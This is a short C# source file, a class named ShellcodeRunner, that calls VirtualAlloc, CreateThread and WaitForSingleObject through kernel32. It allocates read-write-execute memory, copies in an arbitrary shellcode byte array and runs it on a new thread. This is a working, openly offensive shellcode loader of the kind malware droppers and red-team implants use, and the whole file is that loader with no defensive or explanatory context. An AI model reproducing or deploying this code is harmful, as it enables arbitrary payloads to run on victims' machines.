using System;
using System.Runtime.InteropServices;

public class ShellcodeRunner
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    
    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void Execute(byte[] shellcode)
    {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out uint threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}